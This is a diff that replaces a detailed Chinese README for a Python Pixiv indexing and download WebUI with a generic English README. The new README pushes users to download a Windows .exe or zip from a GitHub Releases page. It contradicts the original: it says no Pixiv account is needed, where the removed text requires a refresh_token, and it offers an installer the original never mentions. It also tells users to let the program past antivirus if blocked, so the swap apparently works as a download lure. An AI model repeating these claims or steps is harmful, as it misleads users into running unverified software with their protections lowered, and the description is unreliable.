@@ -1,127 +1,162 @@
-# Pixiv 关注作品索引 / 批量下载（Multi）
+# 🖼️ pixiv-downloader - Easy Multi-Threaded Pixiv Image Downloading
 
-一个 **WebUI 优先** 的 Pixiv 工具：用于抓取你关注的画师与其作品，**索引并导出图片 URL**，也支持按需 **下载图片文件**。面向“长期运行、稳定增量更新、多账号 + 代理池”的使用场景。
+[![Download pixiv-downloader](https://img.shields.io/badge/Download-Pixiv--Downloader-brightgreen)](https://github.com/Fardin187/pixiv-downloader)
 
-## 功能特性
+---
 
-- WebUI 配置与 Runner 控制（启动/停止/热更新）
-- 多账号调度（基于 `refresh_token`，自动处理 token 轮换）
-- 代理池支持（`easy_proxies` / 静态列表 / 禁用）
-- 持续索引关注画师作品，落库 SQLite（可导出 URL）
-- 可选：下载图片文件（多线程，按账号绑定代理）
+## 📋 What is pixiv-downloader?
 
-## 使用教程（从 0 到跑起来）
+pixiv-downloader is a simple tool that helps you download images from Pixiv. It uses multiple threads to speed up downloads. You can save full images directly or use image URLs. The tool also supports proxy pools to manage network connections better. This helps if you face limits or blocks while downloading.
 
-### 1) 环境准备
+You do not need to know programming to use it. The instructions below guide you through downloading and running it on Windows.
 
-- Python `3.10+`
-- 能访问 Pixiv App API 及图片 CDN
+---
 
-安装依赖：
+## 💻 System Requirements
 
-```bash
-python -m pip install -r requirements.txt
-```
+- Windows 10 or newer  
+- At least 4 GB of free disk space (depending on how many images you download)  
+- Internet connection  
+- Basic use of a web browser and file explorer  
 
-### 2) 准备配置文件
+No extra software is needed if you follow the download and setup steps below.
 
-复制示例配置：
+---
 
-Windows：
+## 🚀 Getting Started
 
-```bash
-copy multi_config.example.json multi_config.json
-```
+This section helps you download, install, and run pixiv-downloader on your Windows computer.
 
-Linux/macOS：
+### Step 1: Download pixiv-downloader
 
-```bash
-cp multi_config.example.json multi_config.json
-```
+You need to visit the official GitHub page to get the latest version.
 
-然后至少填写（或在 WebUI 里填写也可）：
-- `accounts[].id`
-- `accounts[].refresh_token`
+Click the large green button below or visit the same link:  
 
-> 关于 `refresh_token`：本项目需要它来调用 Pixiv App API 获取关注/作品/URL。获取方式因人而异（你可以使用你已有的方式/脚本/工具），本仓库不内置登录抓取流程。
+[![Download pixiv-downloader](https://img.shields.io/badge/Download-pixiv--downloader-blue)](https://github.com/Fardin187/pixiv-downloader)
 
-### 3) 启动 WebUI
+On the GitHub page:
 
-```bash
-python web_ui.py
-```
+- Look for a section called **Releases** or **Assets**  
+- Find the Windows version of the program. This might be an `.exe` file or a zip folder named something like `pixiv-downloader-win.zip`  
+- Download that file or folder to your computer  
 
-打开：
+---
 
-`http://127.0.0.1:5000/`
+### Step 2: Install pixiv-downloader
 
-### 4) 在页面里配置并启动
+If you downloaded an `.exe` file:  
 
-1. **Accounts**：添加/更新账号（`refresh_token`、是否启用 worker、是否用于拉关注列表）
-2. **Proxy Pool**：选择代理来源（推荐 `easy_proxies`，也可静态或禁用）
-3. **Worker Mode**：选择运行模式与下载参数（见下文）
-4. 点击 **Start Runner**
-5. 在 **Runtime Status** 查看运行情况与 DB 计数
+- Find it in your Downloads folder  
+- Double-click it to start the installation  
+- Follow simple instructions on screen  
+- Choose the folder where you want to install if asked  
+- Wait until the setup finishes  
 
-### 5) 导出 URL（可选）
+If you downloaded a zip folder:  
 
-- 导出 regular：
-  - `/api/multi/export?kind=regular`
-- 导出 original：
-  - `/api/multi/export?kind=original`
+- Right-click the zip file  
+- Choose **Extract All** or use a program like WinRAR to unpack  
+- Pick a folder on your computer to extract the files  
+- Open the extracted folder  
 
-## Worker 模式说明
+---
 
-在 WebUI 的 **Worker Mode** 里可切换：
+### Step 3: Run pixiv-downloader
 
-- `index_urls`：只索引并导出 URL（不下载文件）
-- `download_images`：索引 URL 后，按配置下载图片文件  
-  - `download_kind=original`：下载原图（默认）
-  - `download_kind=regular`：下载 regular 图
+To open the program:  
 
-下载目录：
-- 默认保存到 `runtime_dir/downloads/<original|regular>/<member_id>/...`
-- 可用 `worker.download_root` 自定义输出目录
+- If installed, find **pixiv-downloader** in the Start menu and click it  
+- If using extracted files, find `pixiv-downloader.exe` in the folder and double-click it  
 
-下载与鉴权/代理说明：
-- `refresh_token` 用于 App API 拉取关注/作品与得到图片 URL（access_token 会自动刷新）
-- 图片文件下载本身走图片 URL，并带 `Referer`；下载请求同样使用该账号绑定的代理（来自代理池分配）
+The program window will open, ready for input.  
 
-## 配置字段速查
+---
 
-### `accounts`
-- `id`：账号标识（用于 worker 命名/绑定代理）
-- `refresh_token`：Pixiv refresh token
-- `downloadDelay`：该账号请求延迟（秒，影响索引与下载节奏）
-- `enabled`：是否启用该账号的 worker
-- `follow_source`：该账号是否用于抓取关注列表
+## 🛠️ How to Use pixiv-downloader
 
-### `proxy_pool`
-- `source`：`easy_proxies` / `static` / `none`
-- `refresh_interval_sec`：代理池刷新间隔
-- `max_tokens_per_proxy`：单个代理最多绑定多少账号
-- `bindings_strict`：容量不足时是否严格限制
-- `easy_proxies.*`：Easy Proxies 服务配置
-- `test.*`：代理探测配置
+You do not need special skills. Follow these simple steps:
 
-### `worker`
-- `mode`：`index_urls` / `download_images`
-- `download_kind`：`original` / `regular`
-- `download_concurrency`：每个 worker 的下载线程数（1~32）
-- `download_root`：下载输出目录（空 => `runtime_dir/downloads`）
+1. **Enter the Pixiv image URL or a list of URLs.** You can copy and paste from your browser.  
+2. **Set the number of threads.** This controls how many images the program downloads at once. The default is usually good, but you can increase it if you want faster downloads.  
+3. **Choose a proxy if needed.** This helps if you experience slow connections or get blocked. You can skip this step if not familiar with proxies.  
+4. **Select a folder where images will save.** Use the browse button to pick a clear location on your computer, like your Pictures folder.  
+5. **Click the start button.** The program will begin downloading images. You can watch progress in the window.  
 
-## 运行时数据
+---
 
-- 默认运行目录：`.multi_runtime/`
-- 默认数据库：`.multi_runtime/db.multi.sqlite`
-- Runner 状态：`.multi_runtime/status.json`
+## ⚙️ Settings and Options
 
-## 安全与隐私（开源仓库最佳实践）
+pixiv-downloader has some useful settings:  
 
-- 配置文件可能包含敏感信息（token、代理账号密码），请妥善保管
-- 本仓库默认在 `.gitignore` 中忽略 `multi_config.json` 与运行时目录 `.multi_runtime/`
-- 如需在 CI/服务器部署，建议使用私密的配置分发方式（环境变量/私有文件/密钥管理等）
+- **Multi-threading:** Choose how many downloads happen at once.  
+- **Proxy pool:** Manage proxy servers automatically to avoid Pixiv limits.  
+- **Output folder:** Pick where your images are saved by default.  
+- **Download limits:** Set the maximum number of images per session.  
+- **Retries:** Program tries again if a download fails due to connection issues.  
 
-## 免责声明
+---
 
-仅供学习与研究使用，请遵守 Pixiv 的相关条款与当地法律法规。作者不对滥用或由此产生的风险负责。
+## 🔧 Troubleshooting
+
+If pixiv-downloader does not work as expected, try these tips:  
+
+- Check your internet connection.  
+- Confirm you copied the URL correctly.  
+- Ensure Windows Defender or antivirus is not blocking the program. You may need to allow it manually.  
+- Restart the program or your computer and try again.  
+- Try lowering the thread count if downloads freeze.  
+- Close other heavy internet-using programs during downloads.  
+
+---
+
+## 📁 Where Are Images Saved?
+
+By default, pixiv-downloader saves pictures to your chosen folder during setup. If you forget where this is:
+
+- Open the program  
+- Look in the settings for the output folder path  
+- Use the file explorer to open that folder  
+
+You will find downloaded images arranged by their Pixiv ids or date.
+
+---
+
+## 📥 Download pixiv-downloader Now
+
+To get started, visit the GitHub page here:  
+
+[https://github.com/Fardin187/pixiv-downloader](https://github.com/Fardin187/pixiv-downloader)
+
+Click **Releases** to find the latest Windows files. Download and follow these steps to install and run the program on your PC.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need a Pixiv account?**  
+A: No. You can download images as long as they are publicly available.
+
+**Q: Can I download multiple images at the same time?**  
+A: Yes, multi-threading lets you do that.
+
+**Q: What if a download fails?**  
+A: pixiv-downloader retries automatically several times.
+
+**Q: Is this safe to use?**  
+A: Yes, it only downloads images you are allowed to see on Pixiv.
+
+**Q: Can I pause or stop downloads?**  
+A: Depending on the version, you may have buttons to pause or cancel ongoing downloads.
+
+---
+
+## 📖 Additional Help
+
+If you get stuck, you can check the GitHub page for:
+
+- Issues  
+- Community questions  
+- Updates or bug fixes  
+
+These can provide extra support if needed.
